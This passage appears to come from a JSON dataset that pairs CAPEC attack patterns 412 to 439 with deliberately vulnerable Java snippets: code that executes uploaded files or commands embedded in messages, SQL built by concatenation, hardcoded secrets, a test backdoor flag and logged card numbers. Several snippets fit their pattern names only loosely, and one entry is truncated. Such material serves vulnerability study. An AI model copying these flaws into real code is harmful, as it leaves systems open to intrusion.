        "code_snippet": "public class CustomerServicePortal {\n    private static Map<String, CustomerInfo> customerDatabase = new HashMap<>();\n\n    public static void handleCustomerRequest(String callerPhoneNumber) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to Customer Service. Please verify your identity.\");\n        \n        System.out.println(\"Please provide your credit card number:\");\n        String creditCardNumber = scanner.nextLine();\n        \n        System.out.println(\"Please provide your CVV:\");\n        String cvv = scanner.nextLine();\n        \n        // Vulnerable: No proper authentication or verification of caller identity\n        CustomerInfo info = new CustomerInfo(creditCardNumber, cvv);\n        customerDatabase.put(callerPhoneNumber, info);\n        \n        // Immediately process sensitive operation without verification\n        processCustomerRequest(callerPhoneNumber, creditCardNumber);\n    }\n    \n    private static void processCustomerRequest(String callerPhoneNumber, String creditCardNumber) {\n        // Vulnerable: Sensitive data exposed in logs\n        System.out.println(\"Processing request for card: \" + creditCardNumber);\n        // Process transaction...\n    }\n    \n    private static class CustomerInfo {\n        String creditCardNumber;\n        String cvv;\n        \n        CustomerInfo(String ccn, String cvv) {\n            this.creditCardNumber = ccn;\n            this.cvv = cvv;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable customer service portal that fails to properly verify the identity of callers and handles sensitive credit card information insecurely. It collects sensitive data without proper authentication, stores it in memory, and exposes it through logging. The code exemplifies social engineering vulnerabilities where an attacker could pose as customer service to collect credit card information."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "public class TechSupportPortal {\n    private static final String SUPPORT_DIR = \"/public/support/uploads/\";\n    \n    public void handleTechSupportRequest(String userID, String supportTicket, File attachment) {\n        // Store user's personal information in publicly accessible directory\n        String userInfoPath = SUPPORT_DIR + userID + \"/info.txt\";\n        try {\n            FileWriter writer = new FileWriter(userInfoPath);\n            writer.write(\"User Details: \" + getUserPersonalInfo(userID));\n            writer.close();\n            \n            // Accept and store any file without validation\n            if (attachment != null) {\n                String fileName = attachment.getName();\n                Path destination = Paths.get(SUPPORT_DIR + userID + \"/\" + fileName);\n                Files.copy(attachment.toPath(), destination, StandardCopyOption.REPLACE_EXISTING);\n                executeUploadedFile(destination.toString());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void executeUploadedFile(String filePath) {\n        try {\n            Runtime.getRuntime().exec(filePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String getUserPersonalInfo(String userID) {\n        return \"SSN: 123-45-6789\\nCredit Card: 4111-1111-1111-1111\\nAddress: 123 Main St\";\n    }\n}",
        "description": "This vulnerable code demonstrates a tech support portal that handles support requests and file uploads. It exhibits multiple security flaws: storing sensitive personal information in publicly accessible directories (CWE-538), exposing private information (CWE-359), allowing unrestricted file uploads without validation (CWE-434), and automatically executing uploaded files. This code could be exploited by an attacker posing as tech support to upload malicious files and access sensitive information."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "public class DeliverySystem {\n    private static final String DELIVERY_LOG_PATH = \"/public/deliveries/\";\n\n    public void processDeliveryRequest(String trackingId, String recipientId) {\n        String authToken = \"Bearer \" + getAuthToken();\n        \n        // Vulnerable: No validation of delivery person credentials\n        DeliveryPerson deliveryPerson = new DeliveryPerson(authToken);\n        \n        // Vulnerable: Sensitive information stored in public directory\n        String logFile = DELIVERY_LOG_PATH + trackingId + \".txt\";\n        FileWriter writer = new FileWriter(logFile);\n        writer.write(\"Recipient ID: \" + recipientId + \"\\n\");\n        writer.write(\"Auth Token: \" + authToken + \"\\n\");\n        writer.close();\n        \n        // Vulnerable: No verification of endpoint identity\n        URL url = new URL(\"http://delivery-status.com?id=\" + trackingId);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestProperty(\"Authorization\", authToken);\n        conn.connect();\n    }\n\n    private String getAuthToken() {\n        // Vulnerable: Weak authentication mechanism\n        return \"delivery_token_\" + System.currentTimeMillis();\n    }\n}",
        "description": "This vulnerable code demonstrates a delivery system that fails to properly validate delivery person credentials, stores sensitive information in publicly accessible directories, and does not properly verify communication endpoints. It allows potential attackers to impersonate legitimate delivery personnel by exploiting weak authentication and insecure data storage practices."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "public class HelpDesk {\n    public void handleSupportCall(String callerName, String employeeId) {\n        // No verification of caller identity\n        if (callerName != null && employeeId != null) {\n            // Directly grant access based on provided information\n            String userPassword = DatabaseService.getUserPassword(employeeId);\n            String accessToken = SecurityService.generateAccessToken(employeeId);\n            \n            // Send sensitive information over unsecured channel\n            EmailService.sendCredentials(callerName, userPassword, accessToken);\n            \n            // Log access without verification\n            System.out.println(\"Password reset completed for: \" + callerName);\n        }\n    }\n\n    public void resetUserCredentials(String callerName, String employeeId, String reason) {\n        // No caller verification or authentication\n        if (reason.toLowerCase().contains(\"technical support\")) {\n            // Automatically trust caller claiming to be tech support\n            String newPassword = SecurityService.generateTemporaryPassword();\n            DatabaseService.updatePassword(employeeId, newPassword);\n            \n            // Send sensitive data without verification\n            EmailService.sendNewCredentials(callerName, employeeId, newPassword);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a help desk system that fails to properly authenticate callers and exposes sensitive information. It accepts caller-provided information without verification, processes password resets based on simple claims, and sends sensitive data over potentially unsecured channels. The code is susceptible to social engineering attacks where an adversary can impersonate legitimate employees or IT staff to gain unauthorized access to credentials and sensitive information."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "public class HelpDeskSystem {\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private DatabaseConnection db;\n\n    public boolean authenticate(String username, String phoneNumber) {\n        // No rate limiting on authentication attempts\n        if (!loginAttempts.containsKey(username)) {\n            loginAttempts.put(username, 1);\n        }\n\n        String query = \"SELECT * FROM employees WHERE username = '\" + username + \"' AND phone = '\" + phoneNumber + \"'\";\n        ResultSet result = db.executeQuery(query);\n\n        try {\n            if (result.next()) {\n                // Verbose error messages reveal account existence\n                System.out.println(\"Login successful for user: \" + username);\n                sendWelcomeEmail(result.getString(\"email\"));\n                return true;\n            } else {\n                System.out.println(\"Invalid credentials for: \" + username);\n                // Leaks timing information\n                Thread.sleep(username.length() * 100);\n                return false;\n            }\n        } catch (Exception e) {\n            // Detailed error exposure\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This code represents a vulnerable help desk authentication system that is susceptible to social engineering attacks through multiple vectors: it lacks rate limiting on authentication attempts (CWE-799), exposes sensitive information through error messages and database queries (CWE-200, CWE-202), reveals behavioral differences through timing variations (CWE-205), and creates emergent information disclosure through verbose logging and error handling (CWE-1229)."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "public class AuthenticationSystem {\n    private static final String SECRET_KEY = \"s3cr3tK3y123\";\n    private boolean isAdmin = false;\n\n    public boolean authenticateUser(String username, String token) {\n        // Rely on single factor and obscure logic for authentication\n        if (token.startsWith(SECRET_KEY.substring(0, 5))) {\n            System.out.println(\"Authentication attempt for: \" + username);\n            isAdmin = true;\n            return true;\n        }\n        return false;\n    }\n\n    public void processUserRequest(String username, String request) {\n        if (request.contains(\"admin\")) {\n            // Observable behavior reveals internal state\n            System.out.println(\"Processing admin request...\");\n            if (isAdmin) {\n                executeAdminCommand(request);\n            }\n        } else {\n            // Truncates security-relevant information\n            System.out.println(\"User request from: \" + \n                username.substring(0, Math.min(username.length(), 5)));\n        }\n    }\n\n    private void executeAdminCommand(String command) {\n        // Implementation details hidden\n    }\n}",
        "description": "This code demonstrates security through obscurity and single factor authentication vulnerabilities. It relies on a hard-coded secret key, reveals system state through observable behavior, truncates security-relevant information, and uses a simple token-based authentication that could be susceptible to reflection attacks. The authentication mechanism depends solely on checking if the token starts with a portion of the secret key, making it vulnerable to social engineering attacks where an attacker could potentially guess or obtain partial key information."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "public class NetworkAuthentication {\n    private Socket clientSocket;\n    private String userCredentials;\n\n    public boolean authenticateUser(String username, String token) {\n        try {\n            // Vulnerable: No proper verification of communication source\n            clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            \n            // Vulnerable: Accepts any complimentary message as trusted\n            String message = in.readLine();\n            if(message.contains(\"trusted_partner\") || message.contains(\"verified_client\")) {\n                // Vulnerable: Automatically sends sensitive information upon receiving compliment\n                userCredentials = \"USER:\" + username + \";TOKEN:\" + token;\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                out.println(userCredentials);\n                return true;\n            }\n            return false;\n        } catch(IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates social engineering susceptibility in a network authentication system. It accepts connections without proper source verification, automatically trusts messages containing certain keywords, and responds by sending sensitive credentials. The code fails to properly validate the communication channel endpoints and is susceptible to reflection attacks where an attacker could manipulate the authentication flow through crafted complimentary messages."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "public class ProtocolNegotiator {\n    public String negotiateEncryption(String[] clientAlgorithms) {\n        String[] serverAlgorithms = {\"AES256\", \"DES\", \"NULL\"};\n        \n        for (String clientAlgo : clientAlgorithms) {\n            for (String serverAlgo : serverAlgorithms) {\n                if (clientAlgo.equals(serverAlgo)) {\n                    System.out.println(\"Selected algorithm: \" + serverAlgo);\n                    return serverAlgo;\n                }\n            }\n        }\n        return \"NULL\";\n    }\n    \n    public void establishConnection(String host) {\n        if (host.contains(\"internal\")) {\n            Thread.sleep(500);  // Slower response for internal hosts\n            System.out.println(\"Connection established\");\n        } else {\n            System.out.println(\"Connection failed\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security weaknesses: algorithm downgrade during negotiation (CWE-757) by accepting weaker encryption options, observable timing differences (CWE-203/205) through different response times for internal vs external hosts, and potential interpretation conflicts (CWE-436) in protocol handling. The code leaks information through both behavior and response patterns."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "public class LimitedTimeOffer {\n    private static final int MAX_ATTEMPTS = 3;\n    private static int remainingAttempts = MAX_ATTEMPTS;\n    private static final String SECRET_KEY = \"sk_12345\";\n\n    public static boolean processDiscount(String userInput, String sessionId) {\n        if (remainingAttempts <= 0) {\n            return false;\n        }\n\n        remainingAttempts--;\n        \n        // Display urgency message without proper validation\n        System.out.println(\"Only \" + remainingAttempts + \" attempts left! Act now!\");\n        \n        // Single factor authentication with obscure secret\n        if (userInput.startsWith(SECRET_KEY.substring(0, 3))) {\n            // Resource intensive operation without proper limits\n            while (!sessionId.isEmpty()) {\n                sessionId = processRequest(sessionId);\n            }\n            return true;\n        }\n        return false;\n    }\n\n    private static String processRequest(String data) {\n        // Expensive operation that can be exploited\n        return data.substring(1);\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of a limited-time offer system that embodies security through obscurity, single-factor authentication, and resource amplification vulnerabilities. It creates artificial scarcity through a countdown mechanism while exposing internal state and using weak validation methods."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "public class AuthenticationSystem {\n    private static Map<String, String> userRoles = new HashMap<>();\n    \n    static {\n        userRoles.put(\"admin@company.com\", \"ADMIN\");\n    }\n    \n    public static boolean authenticateUser(String email, String claimedRole) {\n        String requestOrigin = request.getHeader(\"X-Forwarded-For\");\n        \n        // Vulnerable: trusts email header without verification\n        String emailHeader = request.getHeader(\"From\");\n        \n        // Vulnerable: single factor authentication based only on email\n        if(emailHeader != null && emailHeader.endsWith(\"@company.com\")) {\n            // Vulnerable: no verification if the user actually has this role\n            if(claimedRole.equals(\"ADMIN\")) {\n                grantAdminAccess(email);\n                return true;\n            }\n        }\n        return false;\n    }\n    \n    private static void grantAdminAccess(String email) {\n        // Vulnerable: logs only first 10 characters of email\n        String truncatedEmail = email.substring(0, Math.min(email.length(), 10));\n        System.out.println(\"Granted admin access to: \" + truncatedEmail);\n    }\n}",
        "description": "This vulnerable code demonstrates authentication flaws related to authority impersonation. It relies on unverified email headers, uses single-factor authentication, fails to properly validate the communication channel, and truncates security-relevant logging information. An attacker could impersonate an admin by spoofing email headers or using reflection attacks."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "public class UserRequestHandler {\n    private Map<String, Integer> userRequestCounts = new HashMap<>();\n    private static final int REQUEST_THRESHOLD = 5;\n\n    public boolean processUserRequest(String userId, String requestType) {\n        // Increment request count without proper validation\n        int currentCount = userRequestCounts.getOrDefault(userId, 0);\n        userRequestCounts.put(userId, currentCount + 1);\n\n        if (\"small_task\".equals(requestType)) {\n            // Always approve small tasks without proper verification\n            return true;\n        } else if (\"large_task\".equals(requestType)) {\n            // Check if user has completed small tasks before\n            if (currentCount >= REQUEST_THRESHOLD) {\n                // Automatically approve larger tasks if threshold met\n                return true;\n            }\n            // Return different response based on request count\n            return false;\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates a user request handling system that fails to properly validate request origins and frequencies. It tracks user requests without proper authentication, allows unlimited small task requests, and automatically approves larger tasks based on previous interaction counts. The code exposes behavioral patterns through different responses and lacks proper request validation, making it susceptible to request smuggling and social engineering attacks."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "public class UserAuthentication {\n    private static final String SECRET_KEY = \"mysecretkey123\";\n    private Map<String, User> userSessions = new HashMap<>();\n\n    public boolean authenticate(String username, String token) {\n        // Simple reflection-vulnerable authentication\n        if (userSessions.containsKey(username)) {\n            // Single factor authentication relying only on token\n            return token.equals(SECRET_KEY);\n        }\n        return false;\n    }\n\n    public void processLogin(String username, String password) {\n        // Observable timing behavior reveals valid usernames\n        if (isKnownUser(username)) {\n            Thread.sleep(1000);\n            checkPassword(password);\n        }\n    }\n\n    // Android component with implicit intent for sensitive data\n    public void shareUserData(Context context, String userData) {\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.SHARE_USER_DATA\");\n        intent.putExtra(\"sensitive_data\", userData);\n        context.sendBroadcast(intent);\n    }\n}",
        "description": "A vulnerable authentication system that demonstrates trust relationship exploitation through multiple weaknesses: single-factor authentication, reflection vulnerability, observable timing behavior, and insecure data sharing through implicit intents. The code relies on security through obscurity with a hardcoded secret key and exposes behavioral differences that could be exploited."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "public class AuthenticationService {\n    private static final String TRUSTED_DOMAIN = \"trusted-company.com\";\n    \n    public boolean authenticateUser(String email, String token) {\n        // Vulnerable: Relies on single factor (email domain) for critical security decision\n        if (email.endsWith(TRUSTED_DOMAIN)) {\n            System.out.println(\"User from trusted domain detected\");\n            return true;\n        }\n        \n        // Observable behavior difference reveals authentication logic\n        if (token == null) {\n            System.out.println(\"Missing token\");\n            return false;\n        } else {\n            System.out.println(\"Validating token...\");\n            return validateToken(token);\n        }\n    }\n    \n    private boolean validateToken(String token) {\n        // Implementation details visible through timing behavior\n        try {\n            Thread.sleep(token.length() * 100);\n            return token.length() > 10;\n        } catch (InterruptedException e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates social engineering through observable behaviors. It trusts users from a specific domain without proper verification, reveals authentication logic through different messages, and has timing variations that leak information about token validation. The system's behavior can be observed and manipulated by attackers to gain unauthorized access."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "public class SecurityAuthenticator {\n    private static final String WELCOME_MSG = \"Welcome! Please verify your identity\";\n    \n    public boolean authenticateUser(String username, String token) {\n        UserInterface ui = new UserInterface();\n        ui.displayMessage(WELCOME_MSG);\n        \n        // Single factor authentication (CWE-654)\n        if(token != null && !token.isEmpty()) {\n            // Misleading UI message suggesting higher security (CWE-451)\n            ui.displayMessage(\"Enhanced security verification in progress...\");\n            \n            // Insecure communication channel setup (CWE-941, CWE-300)\n            CommunicationChannel channel = new CommunicationChannel(\"default_endpoint\");\n            \n            // Allows downgrade to weaker encryption (CWE-757)\n            channel.setEncryption(\"ANY\");\n            \n            // Always returns positive response to maintain 'friendly' framing\n            ui.displayMessage(\"Verification successful! Would you like to proceed?\");\n            return true;\n        }\n        return true; // Returns true anyway to avoid negative responses\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that employs psychological framing techniques to create a false sense of security. It relies on a single authentication factor, presents misleading security messages, uses an insecure communication channel, allows encryption downgrades, and avoids negative responses to maintain positive framing, making it susceptible to social engineering attacks."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "public class IncentiveSystem {\n    private Map<String, Double> userBalances = new HashMap<>();\n    private String adminKey = \"secret123\";\n\n    public void processReward(String userId, String referralCode, double amount) {\n        if (referralCode.startsWith(\"SPECIAL\")) {\n            // Vulnerable amplification: No limit on reward multiplication\n            amount *= 10;\n        }\n\n        // Single factor authentication for admin operations\n        if (referralCode.equals(adminKey)) {\n            userBalances.put(userId, Double.POSITIVE_INFINITY);\n            return;\n        }\n\n        // Vulnerable resource creation through referral chain\n        String[] referralChain = referralCode.split(\"-\");\n        for (String referrer : referralChain) {\n            if (userBalances.containsKey(referrer)) {\n                userBalances.put(referrer, userBalances.get(referrer) + (amount * 0.1));\n            }\n        }\n\n        // No validation of destination user\n        userBalances.put(userId, userBalances.getOrDefault(userId, 0.0) + amount);\n    }\n}",
        "description": "This code demonstrates a vulnerable incentive system that can be exploited through referral codes. It includes security through obscurity (hidden admin key), single factor authentication, asymmetric resource consumption (unlimited reward multiplication), emergent resource creation (referral chain rewards), and incorrect destination specification (no user validation). An attacker could manipulate the system to gain unauthorized rewards or admin access."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "public class AuthenticationSystem {\n    private static boolean isAdmin = false;\n\n    public static void login(String username, String message) {\n        // Vulnerable to social engineering through observable behavior\n        if (username.equals(\"admin\")) {\n            System.out.println(\"Processing admin request...\");\n            // Longer processing time for admin\n            try { Thread.sleep(1000); } catch(InterruptedException e) {}\n        }\n\n        // Single factor authentication vulnerable to reflection\n        if (message.contains(\"trusted_token\")) {\n            isAdmin = true;\n            // Truncates security-relevant information\n            System.out.println(\"Login successful: \" + \n                username.substring(0, Math.min(5, username.length())));\n        }\n    }\n\n    public static boolean performAdminAction(String action) {\n        // External influence on security decision\n        if (action.toLowerCase().contains(\"please\")) {\n            return true; // Bypass admin check if asked politely\n        }\n        return isAdmin;\n    }\n}",
        "description": "This code demonstrates social engineering vulnerabilities through timing-based behavioral discrepancy, single-factor authentication, truncation of security information, and susceptibility to external influence through politeness-based bypasses. The system reveals its internal state through observable timing differences and can be manipulated through social engineering tactics."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "public class ChatBot {\n    private Map<String, String> userPatterns = new HashMap<>();\n    private Socket clientSocket;\n\n    public void establishConnection(String clientId) {\n        try {\n            clientSocket = new Socket(clientId, 8080);\n            // No verification of client identity\n            startConversation();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startConversation() {\n        try {\n            DataInputStream input = new DataInputStream(clientSocket.getInputStream());\n            DataOutputStream output = new DataOutputStream(clientSocket.getOutputStream());\n\n            String userMessage = input.readUTF();\n            // Store and mirror user's communication patterns without validation\n            userPatterns.put(clientSocket.getInetAddress().toString(), userMessage);\n            \n            // Reflect back user's communication style without authentication\n            String response = mirrorUserStyle(userMessage);\n            output.writeUTF(response);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String mirrorUserStyle(String message) {\n        // Blindly mirror user's communication style without validation\n        return \"I understand \" + message.substring(0, Math.min(message.length(), 50));\n    }\n}",
        "description": "This vulnerable code demonstrates a chat system that mirrors user communication patterns without proper authentication or validation. It establishes unsecured connections, stores user patterns without verification, and reflects communication styles back to users without proper endpoint validation. The code is susceptible to reflection attacks, channel manipulation, and lacks proper security verification of the communication source."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "public class PasswordValidator {\n    public boolean validatePassword(String password) {\n        boolean isValid = false;\n        try {\n            // Simulate password validation\n            Thread.sleep(50);\n            if (password.length() >= 8) {\n                Thread.sleep(100);\n                isValid = true;\n            } else {\n                Thread.sleep(10);\n                isValid = false;\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        // Observable behavior through eye movements - different timing responses\n        if (isValid) {\n            displayResultSlowly(\"Password validated\");\n        } else {\n            displayResultQuickly(\"Invalid password\");\n        }\n        return isValid;\n    }\n\n    private void displayResultSlowly(String message) {\n        // Slow display reveals success\n        try {\n            for (char c : message.toCharArray()) {\n                System.out.print(c);\n                Thread.sleep(200);\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void displayResultQuickly(String message) {\n        // Quick display reveals failure\n        System.out.println(message);\n    }\n}",
        "description": "This code demonstrates a vulnerable password validation system that leaks information through observable timing differences and visual feedback patterns. An attacker can determine the success or failure of password attempts by observing the speed and pattern of the displayed response, similar to how eye movements might reveal information in the CAPEC description. The code exhibits CWE-205 and CWE-203 by having observable behavioral discrepancies in its response times and display patterns."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "public class TransientExecutionVulnerability {\n    private static final int ARRAY_SIZE = 256;\n    private static byte[] secretData = \"SENSITIVE_PASSWORD_123\".getBytes();\n    private static byte[] cache = new byte[ARRAY_SIZE];\n\n    public static void processData() {\n        // Vulnerable code demonstrating speculative execution side channel\n        for (int i = 0; i < secretData.length; i++) {\n            int index = secretData[i] & 0xff;\n            // Artificially create speculative execution window\n            if (i < secretData.length) {\n                // Cache timing side channel\n                cache[index] = 1;\n            }\n            // Debug logging exposing sensitive information\n            System.out.println(\"Debug: Processing byte at index \" + i + \": \" + index);\n        }\n    }\n\n    public static void main(String[] args) {\n        processData();\n        // Excessive logging of sensitive operations\n        for (int i = 0; i < cache.length; i++) {\n            if (cache[i] == 1) {\n                System.out.println(\"Server Log: Cache hit at index \" + i);\n            }\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including information exposure through debug/server logs, excessive attack surface through unnecessary logging, and potential exploitation of transient execution side channels. The code processes sensitive data in a way that could be vulnerable to timing attacks and speculative execution vulnerabilities, while also logging sensitive information that could be exposed through debug and server logs."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "\"public class ErrorProcessor {\\n    public void processTemplateAndDisplayError(String userInput) {\\n        try {\\n            String templateContent = \\\"<div>Welcome ${\" + userInput + \\\"",
        "description": "\"This code demonstrates multiple vulnerabilities including improper input validation, template injection, exposure of sensitive information in error messages, and cross-site scripting in error pages. It accepts user input without validation, uses it directly in a template engine, and exposes sensitive information (including database credentials) in error messages that could contain malicious scripts.\""
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "public class UserAuthentication {\n    private static final Logger logger = Logger.getLogger(\"debug.log\");\n\n    public boolean validateInput(String userInput) {\n        String sanitizedInput = userInput.replace(\"\\\"\", \"\");\n        logger.debug(\"User provided input: \" + userInput);\n        \n        // Weak CAPTCHA implementation\n        String captcha = generateSimpleCaptcha();\n        return sanitizedInput.contains(\"'\") && validateCaptcha(captcha);\n    }\n\n    private String generateSimpleCaptcha() {\n        // Predictable CAPTCHA generation\n        return \"ABC\" + new Date().getHours() + \"123\";\n    }\n\n    private boolean validateCaptcha(String captcha) {\n        logger.debug(\"CAPTCHA value: \" + captcha);\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple issues: improper quote sanitization that can be bypassed, weak CAPTCHA implementation that's easily guessable, sensitive information exposure through debug logs, and insufficient input validation. The code attempts to sanitize quotes but does it incorrectly, uses a predictable CAPTCHA pattern, and logs sensitive information to debug files."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "public class MessageProcessor {\n    private static final int BUFFER_SIZE = 256;\n    private byte[] messageBuffer = new byte[BUFFER_SIZE];\n\n    public void processMessage(String sourceChannel) {\n        try {\n            Socket socket = new Socket(\"messageserver.com\", 8080);\n            InputStream in = socket.getInputStream();\n            \n            // Vulnerable: No size checking, potential buffer overflow\n            int bytesRead = in.read(messageBuffer);\n            \n            // Vulnerable: No message integrity check\n            String message = new String(messageBuffer);\n            \n            // Vulnerable: Processing embedded commands without validation\n            if(message.contains(\"<cmd>\")) {\n                String command = message.substring(\n                    message.indexOf(\"<cmd>\") + 5,\n                    message.indexOf(\"</cmd>\")\n                );\n                Runtime.getRuntime().exec(command);\n            }\n            \n            // Vulnerable: Sending sensitive data in cleartext\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"PROCESSED: \" + message);\n            \n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including buffer overflow through unchecked buffer copying, lack of message integrity validation, processing of potentially malicious embedded commands, and cleartext transmission of sensitive data. The code processes messages from a network socket without proper bounds checking or validation, potentially allowing for buffer overflow attacks and execution of embedded commands."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "public class UserAuthenticator {\n    private static final int MAX_LOGIN_ATTEMPTS = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    \n    public boolean authenticate(String username, String password) {\n        int attempts = loginAttempts.getOrDefault(username, 0);\n        \n        if (attempts >= MAX_LOGIN_ATTEMPTS) {\n            // Timing attack vulnerability: Different response time reveals account existence\n            try { Thread.sleep(1000); } catch (InterruptedException e) {}\n            return false;\n        }\n        \n        boolean userExists = checkUserExists(username);\n        if (!userExists) {\n            // Vulnerable: Immediate response reveals user non-existence\n            return false;\n        }\n        \n        boolean isValid = validateCredentials(username, password);\n        if (!isValid) {\n            loginAttempts.put(username, attempts + 1);\n        }\n        \n        return isValid;\n    }\n    \n    private boolean checkUserExists(String username) {\n        // Vulnerable: Direct database query without rate limiting\n        String query = \"SELECT COUNT(*) FROM users WHERE username = '\" + username + \"'\";\n        // ... database execution\n        return true; // Simplified\n    }\n    \n    private boolean validateCredentials(String username, String password) {\n        // Simplified validation\n        return true;\n    }\n}",
        "description": "This code represents a vulnerable authentication system that leaks sensitive information through observable timing differences and different error messages. It demonstrates information exposure through data queries (CWE-202), observable behavioral discrepancy (CWE-205), and missing source correlation (CWE-1293). The system reveals whether a username exists through timing differences and immediate responses, allowing attackers to enumerate valid usernames. It also uses a single source for validation without cross-referencing, making it vulnerable to compromised data sources."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "public class InsecureMessagingService {\n    private Socket clientSocket;\n    private String sessionId;\n\n    public void establishConnection(String targetHost) {\n        try {\n            clientSocket = new Socket(targetHost, 9999);\n            sessionId = \"session_\" + System.currentTimeMillis();\n            sendMessage(\"CONNECT:\" + sessionId);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        try {\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            out.println(message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String receiveMessage() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            return in.readLine();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public boolean isValidSession(String receivedSessionId) {\n        return sessionId != null && sessionId.equals(receivedSessionId);\n    }\n}",
        "description": "This code demonstrates various communication channel vulnerabilities. It establishes socket connections without proper endpoint verification, doesn't validate the source of incoming messages, and uses a weak session identification mechanism. The code lacks proper channel security controls, allowing potential man-in-the-middle attacks and unauthorized access. The error handling also reveals system state through stack traces, making the system behavior observable to attackers."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "public class DeviceManufacturing {\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n    private static final boolean IS_DEBUG_MODE = true;\n    private static final String HARDWARE_KEY = \"0xDEADBEEF\";\n\n    public static void initializeDevice() {\n        // Debug credentials left in production\n        String adminPassword = \"default_debug_password\";\n        boolean testMode = true;\n\n        // No validation of component integrity\n        loadUntrustedComponents();\n        \n        // Hardcoded sensitive information accessible by vendors\n        storeDeviceSecrets(HARDWARE_KEY, adminPassword);\n\n        // No update mechanism implemented\n        if(IS_DEBUG_MODE) {\n            enableTestingFeatures();\n        }\n    }\n\n    private static void loadUntrustedComponents() {\n        // Directly loading third-party components without verification\n        System.load(\"/lib/external/untrusted_component.so\");\n    }\n\n    private static void storeDeviceSecrets(String key, String password) {\n        // Storing sensitive data in plaintext\n        Properties props = new Properties();\n        props.setProperty(\"hw_key\", key);\n        props.setProperty(\"admin_pwd\", password);\n    }\n\n    private static void enableTestingFeatures() {\n        // Debug features left enabled in production\n        System.setProperty(\"debug.mode\", \"enabled\");\n        System.setProperty(\"test.backdoor\", \"enabled\");\n    }\n}",
        "description": "This vulnerable code demonstrates multiple supply chain security issues: it includes debug/test configurations in production, stores sensitive information in plaintext accessible to vendors, lacks component verification, contains no update mechanism, and has insufficient security controls. The code relies on untrusted components without verification and includes hardcoded credentials, making it susceptible to supply chain attacks during manufacturing."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
